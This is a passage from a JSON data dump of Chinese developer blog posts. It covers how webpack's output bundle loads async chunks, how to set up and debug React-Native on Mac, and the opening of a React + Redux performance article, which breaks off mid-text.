}\n\n      \u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = show;\n    })\n  ]\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003ccode\u003ebundle.js\u003c/code\u003e 内容如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodules\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-comment\"\u003e/***\n   * webpackJsonp 用于从异步加载的文件中安装模块。\n   * 把 webpackJsonp 挂载到全局是为了方便在其它文件中调用。\n   *\n   * @param chunkIds 异步加载的文件中存放的需要安装的模块对应的 Chunk ID\n   * @param moreModules 异步加载的文件中存放的需要安装的模块列表\n   * @param executeModules 在异步加载的文件中存放的需要安装的模块都安装成功后，需要执行的模块对应的 index\n   */\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003ewindow\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e\"webpackJsonp\"\u003c/span\u003e] = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003ewebpackJsonpCallback\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003echunkIds, moreModules, executeModules\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 把 moreModules 添加到 modules 对象中\u003c/span\u003e\n    \u003cspan class=\"hljs-comment\"\u003e// 把所有 chunkIds 对应的模块都标记成已经加载成功 \u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e moduleId, chunkId, i = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e, resolves = [], result;\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (; i \u0026lt; chunkIds.length; i++) {\n      chunkId = chunkIds[i];\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (installedChunks[chunkId]) {\n        resolves.push(installedChunks[chunkId][\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e]);\n      }\n      installedChunks[chunkId] = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e;\n    }\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (moduleId \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e moreModules) {\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003eObject\u003c/span\u003e.prototype.hasOwnProperty.call(moreModules, moduleId)) {\n        modules[moduleId] = moreModules[moduleId];\n      }\n    }\n    \u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e (resolves.length) {\n      resolves.shift()();\n    }\n  };\n\n  \u003cspan class=\"hljs-comment\"\u003e// 缓存已经安装的模块\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e installedModules = {};\n\n  \u003cspan class=\"hljs-comment\"\u003e// 存储每个 Chunk 的加载状态；\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 键为 Chunk 的 ID，值为0代表已经加载成功\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e installedChunks = {\n    \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\n  };\n\n  \u003cspan class=\"hljs-comment\"\u003e// 模拟 require 语句，和上面介绍的一致\u003c/span\u003e\n  \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003e__webpack_require__\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003emoduleId\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// ... 省略和上面一样的内容\u003c/span\u003e\n  }\n\n  \u003cspan class=\"hljs-comment\"\u003e/**\n   * 用于加载被分割出去的，需要异步加载的 Chunk 对应的文件\n   * @param chunkId 需要异步加载的 Chunk 对应的 ID\n   * @returns {Promise}\n   */\u003c/span\u003e\n  __webpack_require__.e = \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003erequireEnsure\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003echunkId\u003c/span\u003e) \u003c/span\u003e{\n    \u003cspan class=\"hljs-comment\"\u003e// 从上面定义的 installedChunks 中获取 chunkId 对应的 Chunk 的加载状态\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e installedChunkData = installedChunks[chunkId];\n    \u003cspan class=\"hljs-comment\"\u003e// 如果加载状态为0表示该 Chunk 已经加载成功了，直接返回 resolve Promise\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (installedChunkData === \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eresolve\u003c/span\u003e) \u003c/span\u003e{\n        resolve();\n      });\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// installedChunkData 不为空且不为0表示该 Chunk 正在网络加载中\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (installedChunkData) {\n      \u003cspan class=\"hljs-comment\"\u003e// 返回存放在 installedChunkData 数组中的 Promise 对象\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e installedChunkData[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e];\n    }\n\n    \u003cspan class=\"hljs-comment\"\u003e// installedChunkData 为空，表示该 Chunk 还没有加载过，去加载该 Chunk 对应的文件\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e promise = \u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ePromise\u003c/span\u003e(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003eresolve, reject\u003c/span\u003e) \u003c/span\u003e{\n      installedChunkData = installedChunks[chunkId] = [resolve, reject];\n    });\n    installedChunkData[\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e] = promise;\n\n    \u003cspan class=\"hljs-comment\"\u003e// 通过 DOM 操作，往 HTML head 中插入一个 script 标签去异步加载 Chunk 对应的 JavaScript 文件\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e head = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.getElementsByTagName(\u003cspan class=\"hljs-string\"\u003e'head'\u003c/span\u003e)[\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e script = \u003cspan class=\"hljs-built_in\"\u003edocument\u003c/span\u003e.createElement(\u003cspan class=\"hljs-string\"\u003e'script'\u003c/span\u003e);\n    script.type = \u003cspan class=\"hljs-string\"\u003e'text/javascript'\u003c/span\u003e;\n    script.charset = \u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e;\n    script.async = \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e;\n    script.timeout = \u003cspan class=\"hljs-number\"\u003e120000\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-comment\"\u003e// 文件的路径为配置的 publicPath、chunkId 拼接而成\u003c/span\u003e\n    script.src = __webpack_require__.p + \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e + chunkId + \u003cspan class=\"hljs-string\"\u003e\".bundle.js\"\u003c/span\u003e;\n\n    \u003cspan class=\"hljs-comment\"\u003e// 设置异步加载的最长超时时间\u003c/span\u003e\n    \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e timeout = setTimeout(onScriptComplete, \u003cspan class=\"hljs-number\"\u003e120000\u003c/span\u003e);\n    script.onerror = script.onload = onScriptComplete;\n\n    \u003cspan class=\"hljs-comment\"\u003e// 在 script 加载和执行完成时回调\u003c/span\u003e\n    \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eonScriptComplete\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003e\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-comment\"\u003e// 防止内存泄露\u003c/span\u003e\n      script.onerror = script.onload = \u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e;\n      clearTimeout(timeout);\n\n      \u003cspan class=\"hljs-comment\"\u003e// 去检查 chunkId 对应的 Chunk 是否安装成功，安装成功时才会存在于 installedChunks 中\u003c/span\u003e\n      \u003cspan class=\"hljs-keyword\"\u003evar\u003c/span\u003e chunk = installedChunks[chunkId];\n      \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (chunk !== \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (chunk) {\n          chunk[\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e](\u003cspan class=\"hljs-keyword\"\u003enew\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eError\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Loading chunk '\u003c/span\u003e + chunkId + \u003cspan class=\"hljs-string\"\u003e' failed.'\u003c/span\u003e));\n        }\n        installedChunks[chunkId] = \u003cspan class=\"hljs-literal\"\u003eundefined\u003c/span\u003e;\n      }\n    };\n    head.appendChild(script);\n\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e promise;\n  };\n\n  \u003cspan class=\"hljs-comment\"\u003e// 加载并执行入口模块，和上面介绍的一致\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e __webpack_require__(__webpack_require__.s = \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e);\n})\n(\n  \u003cspan class=\"hljs-comment\"\u003e// 存放所有没有经过异步加载的，随着执行入口文件加载的模块\u003c/span\u003e\n  [\n    \u003cspan class=\"hljs-comment\"\u003e// main.js 对应的模块\u003c/span\u003e\n    (\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-params\"\u003emodule, exports, __webpack_require__\u003c/span\u003e) \u003c/span\u003e{\n      \u003cspan class=\"hljs-comment\"\u003e// 通过 __webpack_require__.e 去异步加载 show.js 对应的 Chunk\u003c/span\u003e\n      __webpack_require__.e(\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e).then(__webpack_require__.bind(\u003cspan class=\"hljs-literal\"\u003enull\u003c/span\u003e, \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e)).then(\u003cspan class=\"hljs-function\"\u003e(\u003cspan class=\"hljs-params\"\u003eshow\u003c/span\u003e) =\u0026gt;\u003c/span\u003e {\n        \u003cspan class=\"hljs-comment\"\u003e// 执行 show 函数\u003c/span\u003e\n        show(\u003cspan class=\"hljs-string\"\u003e'Webpack'\u003c/span\u003e);\n      });\n    })\n  ]\n);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这里的 \u003ccode\u003ebundle.js\u003c/code\u003e 和上面所讲的 \u003ccode\u003ebundle.js\u003c/code\u003e 非常相似，区别在于：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e多了一个 \u003ccode\u003e__webpack_require__.e\u003c/code\u003e 用于加载被分割出去的，需要异步加载的 Chunk 对应的文件;\u003c/li\u003e\n\u003cli\u003e多了一个 \u003ccode\u003ewebpackJsonp\u003c/code\u003e 函数用于从异步加载的文件中安装模块。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e在使用了 CommonsChunkPlugin 去提取公共代码时输出的文件和使用了异步加载时输出的文件是一样的，都会有 \u003ccode\u003e__webpack_require__.e\u003c/code\u003e 和 \u003ccode\u003ewebpackJsonp\u003c/code\u003e。\n原因在于提取公共代码和异步加载本质上都是代码分割。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e本实例\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/5-2%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.zip\"\u003e提供项目完整代码\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003c/a\u003e\u003c/p\u003e\u003cfigure\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607259d52144ee4?w=1348\u0026amp;h=845\u0026amp;f=jpeg\u0026amp;s=183464\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/a\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/\"\u003e《深入浅出Webpack》全书在线阅读链接\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"http://webpack.wuhaolin.cn/5%E5%8E%9F%E7%90%86/5-2%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90.html\"\u003e阅读原文\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1515064701.9467","__v":0}
{"_id":{"$oid":"5a4e188de4919b0e782b4c74"},"id":"5a0590ac6fb9a0450c48dfb1","author":{"$oid":"5a4e188de4919b0e782b4c6b"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/11/10/021bf29d74a526ed269e5495cf67fb2d?w=600\u0026h=373\u0026f=png\u0026s=319996","https://user-gold-cdn.xitu.io/2017/11/10/4fca0b8fa0a7e49495046390f5c0799e?w=433\u0026h=852\u0026f=png\u0026s=106125","https://user-gold-cdn.xitu.io/2017/11/10/33b2db5f449257b4a3b5e62f6e87e4ec?w=542\u0026h=118\u0026f=png\u0026s=43876","https://user-gold-cdn.xitu.io/2017/11/10/b6cce8b2b49c00e4a447fa67eb866b63?w=700\u0026h=496\u0026f=png\u0026s=160828","https://user-gold-cdn.xitu.io/2017/11/10/ca4dd4180c9dee6155bf258e93a0f59c?w=700\u0026h=359\u0026f=png\u0026s=161452","https://user-gold-cdn.xitu.io/2017/11/10/c17dba240e66b4f1981b1bc220b31e4a?w=600\u0026h=1067\u0026f=png\u0026s=109728"],"screenShot":null}],"title":"React-Native 环境安装及调试（Mac版）","meta":{"likeCount":0},"tag":["React Native"],"comment":[],"shortContent":"也可以使用Xcode启动项目，点击ios/AwesomeProject.xcodeproj，再点击右上角的Run即可跑起来。 项目启动后，点击模拟器command+d - 选择 Enable Live Reload，监控RN代码的改动（热替换）,可直接修改代码，即可查看最新的修…","content":"\u003cblockquote\u003e\n\u003cp\u003e原文地址：\u003ca target=\"_blank\" href=\"http://www.vsoui.com/2017/11/10/React-Native-run-in-Mac/\"\u003eReact-Native 环境安装及调试（Mac版）\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e准备工作\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e安装必要的软件，这里就不详细说了，具体可参考\u003ca target=\"_blank\" href=\"http://facebook.github.io/react-native/docs/getting-started.html\"\u003e官方文档\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e安装React-Native Cli \u003ccode\u003enpm install -g create-react-native-app\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eXcode 安装升级到 \u003ccode\u003e8+\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e初始化RN项目 \u003ccode\u003ereact-native init rnHelloWord\u003c/code\u003e，可能会比较慢，要耐心等到\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e启动项目\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e进入项目并启动\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e rnHelloWord\nnpm start\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/021bf29d74a526ed269e5495cf67fb2d?w=600\u0026amp;h=373\u0026amp;f=png\u0026amp;s=319996\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e也可以使用Xcode启动项目，点击\u003ccode\u003eios/AwesomeProject.xcodeproj\u003c/code\u003e，再点击右上角的\u003ccode\u003eRun\u003c/code\u003e即可跑起来。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003e调试\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e模拟器调试\u003c/h3\u003e\n\u003cp\u003e项目启动后，点击模拟器\u003ccode\u003ecommand+d\u003c/code\u003e - 选择 \u003ccode\u003eEnable Live Reload\u003c/code\u003e，监控RN代码的改动（热替换）,可直接修改代码，即可查看最新的修改。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/4fca0b8fa0a7e49495046390f5c0799e?w=433\u0026amp;h=852\u0026amp;f=png\u0026amp;s=106125\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e真机调试\u003c/h3\u003e\n\u003ch4 class=\"heading\"\u003ePC上的设置\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e手机通过USB连接电脑，\u0008在Xcode中选择手机作为目标设备。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/33b2db5f449257b4a3b5e62f6e87e4ec?w=542\u0026amp;h=118\u0026amp;f=png\u0026amp;s=43876\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e如图填写，并选择：\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/b6cce8b2b49c00e4a447fa67eb866b63?w=700\u0026amp;h=496\u0026amp;f=png\u0026amp;s=160828\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e同时相关的 Tests target 里同样也要选择使用的开发者账号。\n\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/ca4dd4180c9dee6155bf258e93a0f59c?w=700\u0026amp;h=359\u0026amp;f=png\u0026amp;s=161452\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这样基本工作就完成了，可以点击\u003ccode\u003eRun\u003c/code\u003e启动啦～～\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e手机上设置\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e这时手机上就安装了一个\u003ccode\u003ernHelloWord\u003c/code\u003e的app，点击启动可能会弹一个‘不受信任的’提示，怎么办呢？\n\u003c/p\u003e\u003cfigure\u003e\u003cimg\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e不要着急，我们可以在手机上设置-通用-设备管理-添加信任\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后就可以正常启动了\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e应用启动后，只需要摇一摇手机可以调出调试菜单，里面具体功能同模拟器一样，这里就不再说明了。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e接下来就可以开发了。\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/10/c17dba240e66b4f1981b1bc220b31e4a?w=600\u0026amp;h=1067\u0026amp;f=png\u0026amp;s=109728\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 class=\"heading\"\u003e结束语\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eReact-Native\u003c/code\u003e运行环境安装难于上青天，安装成功后你离成功就不远了。它的语法相近于\u003ccode\u003eReact\u003c/code\u003e，撸起袖子～～～写代码吧。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e更多文章请关注：\u003ca target=\"_blank\" href=\"https://github.com/Hancoson/blog\"\u003e我的博客\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","buildTime":"1514957837.381","__v":0}
{"_id":{"$oid":"5a4e181827fe912a1025ce87"},"id":"5a4ce1e76fb9a045204c9f6b","author":{"$oid":"5a4e181827fe912a1025ce75"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/3/160bc57c6f9a7b73?w=1124\u0026h=727\u0026f=png\u0026s=46578","https://user-gold-cdn.xitu.io/2018/1/3/160bc5b0dc916246?w=1118\u0026h=722\u0026f=png\u0026s=45358","https://user-gold-cdn.xitu.io/2018/1/3/160bc5b6f754adf4?w=1118\u0026h=720\u0026f=png\u0026s=40861","https://user-gold-cdn.xitu.io/2018/1/3/160bc5bea5665642?w=1122\u0026h=626\u0026f=png\u0026s=49140","https://user-gold-cdn.xitu.io/2018/1/3/160bc5c9cb2dfcfc?w=989\u0026h=734\u0026f=png\u0026s=66035","https://user-gold-cdn.xitu.io/2018/1/3/160bc5db736ed86d?w=1454\u0026h=641\u0026f=png\u0026s=82836","https://user-gold-cdn.xitu.io/2018/1/3/160bc5d730c12e6a?w=1200\u0026h=298\u0026f=png\u0026s=15573"],"screenShot":null}],"title":"React + Redux 性能优化（一）：理论篇","meta":{"likeCount":0},"tag":["React.js"],"comment":[],"shortContent":"本文的叙事线索与代码示例均来自High Performance Redux，特此表示感谢。之所以感谢是因为最近一直想系统的整理在 React + Redux 技术栈下的性能优化方案，但苦于找不到切入点。在查阅资料的过程中，这份 Presentation 给了我很大的启发，它的很…","content":"\u003cp\u003e本文的叙事线索与代码示例均来自\u003ca target=\"_blank\" href=\"http://somebody32.github.io/high-performance-redux/\"\u003eHigh Performance Redux\u003c/a\u003e，特此表示感谢。之所以感谢是因为最近一直想系统的整理在 React + Redux 技术栈下的性能优化方案，但苦于找不到切入点。在查阅资料的过程中，这份 Presentation 给了我很大的启发，它的很多观点一针见血，也与我的想法不谋而合。于是这篇文章也是参照它的讲解线索来依次展开我想表达的知识点\u003c/p\u003e\n\u003cp\u003e或许你已经听说过很多的第三方优化方案，比如\u003ccode\u003eimmutable.js\u003c/code\u003e，\u003ccode\u003ereselect\u003c/code\u003e，\u003ccode\u003ereact-virtualized\u003c/code\u003e等等，有关工具的故事下一篇再详谈。首先我们需要了解的是为什么会出现性能问题，以及解决性能问题的思路是什么。当你了解完这一切之后，你会发现其实很多性能问题不需要用第三方类库解决，只需要在编写代码中稍加注意，或者稍稍调整数据结构就能有很大的改观。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e性能不是 patch，是 feature\u003c/h2\u003e\n\u003cp\u003e每个人对性能都有自己的理解。其中有一种观点认为，在程序开发的初期不需要关心性能，当程序规模变大并且出现瓶颈之后再来做性能的优化。我不同意这种观点。性能不应该是后来居上的补丁，而应该是程序天生的一部分。从项目的第一天起，我们就应该考虑做一个\u003ca target=\"_blank\" href=\"http://somebody32.github.io/4\"\u003e10x project\u003c/a\u003e：即能够运行 10k 个任务并且拥有 10 年寿命\u003c/p\u003e\n\u003cp\u003e退一步说即使你在项目的后期发现了瓶颈问题，公司层面不一定会给你足够的排期解决这个问题，毕竟业务项目依然是优先的（还是要看这个性能问题有多“痛”）；再退一步说，即使允许你展优化工作，经过长时间迭代开发后的项目已经和当初相比面目全非了：模块数量庞大，代码耦合严重，尤其是 Redux 项目牵一发而动全身，再想对代码进行优化的话会非常困难。从这个意义上来说，从一开始就将性能考虑进产品中去也是一种 future-proof 的体现，提高代码的可维护性\u003c/p\u003e\n\u003cp\u003e从另一个角度看，代码性能也是个人编程技艺的体现，一位优秀的程序员的代码性能应当是有保障的。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003e存在性能问题的列表\u003c/h2\u003e\n\u003cp\u003e前端框架喜欢把实现 Todo List 作为给新手的教程。我们这里也拿一个 List 举例。假设你需要实现一个列表，用户点击有高亮效果仅此而已。特别的地方在于这个列表有 10k 的行，是的，你没看错 10k 行（上面不是说好我们要做 10x project 吗:p）\u003c/p\u003e\n\u003cp\u003e首先我们看一看基本款代码，由\u003ccode\u003eApp\u003c/code\u003e组件和\u003ccode\u003eItem\u003c/code\u003e组件构成，关键代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs javascript\" lang=\"javascript\"\u003e\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eitemsReducer\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003estate = initial_state, action\u003c/span\u003e) \u003c/span\u003e{\n  \u003cspan class=\"hljs-keyword\"\u003eswitch\u003c/span\u003e (action.type) {\n    \u003cspan class=\"hljs-keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"MARK\"\u003c/span\u003e:\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state.map(\n        \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-params\"\u003eitem\u003c/span\u003e =\u0026gt;\u003c/span\u003e\n          action.id === item.id ? { ...item, \u003cspan class=\"hljs-attr\"\u003emarked\u003c/span\u003e: !item.marked } : item\n      );\n    \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e:\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e state;\n  }\n}\n\n\u003cspan class=\"hljs-class\"\u003e\u003cspan class=\"hljs-keyword\"\u003eclass\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eApp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eextends\u003c/span\u003e \u003cspan class=\"hljs-title\"\u003eComponent\u003c/span\u003e \u003c/span\u003e{\n  render() {\n    \u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e { items, markItem } = \u003cspan class=\"hljs-keyword\"\u003ethis\u003c/span\u003e.props;\n    \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e (\n      \u003cspan class=\"xml\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        {items.map(({ id, marked }) =\u0026gt; (\n          \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003eItem\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003ekey\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{id}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eid\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{id}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003emarked\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{marked}\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eonClick\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e{markItem}\u003c/span\u003e /\u0026gt;\u003c/span\u003e\n        ))}\n      \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    );\n  }\n}\n\nfunction mapStateToProps(state) {\n  return state;\n}\n\nconst markItem = id =\u0026gt; ({ type: \"MARK\", id });\n\nexport default connect(mapStateToProps, { markItem })(App);\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这段关键的代码体现了几个关键的事实：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e列表每一项（\u003ccode\u003eitem\u003c/code\u003e）的数据结构是\u003ccode\u003e{ id, marked 